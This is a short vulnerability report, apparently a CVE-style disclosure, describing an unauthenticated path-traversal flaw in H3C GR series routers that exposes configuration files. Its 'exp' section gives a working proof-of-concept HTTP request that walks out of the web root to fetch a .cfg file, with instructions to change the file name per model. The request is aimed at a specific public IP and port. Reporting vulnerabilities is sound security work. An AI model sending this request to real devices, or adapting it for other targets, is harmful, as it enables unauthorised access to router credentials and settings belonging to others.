# H3C GR series router system management has unauthorized access vulnerability

**Product**: GR series router

**version**: all

**rating**: high-risk

**website**: http://www.h3c.com/

**Hazards**: Attackers can exploit this vulnerability to obtain sensitive information from routers by constructing special request packets to bypass identity verification.

**principle**: The router did not authenticate directory access and related files

**exp**:

Note: It is necessary to modify the file name suffix in POC, such as GR8300.cfg

```http
GET /userLogin.asp/../actionpolicy_status/../GR1100-P.cfg HTTP/1.1
Host: 59.35.220.76:8989
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
![image](https://github.com/yinsel/CVE-H3C-Report/assets/91541985/a57b8b70-9638-4029-9aba-fb562093458c)

![image](https://github.com/yinsel/CVE-H3C-Report/assets/91541985/7c064b0c-e959-4c8f-871d-d93d4a731d1b)

![image](https://github.com/yinsel/CVE-H3C-Report/assets/91541985/cc49f25b-7ffe-4de9-9668-22a00ef5e315)



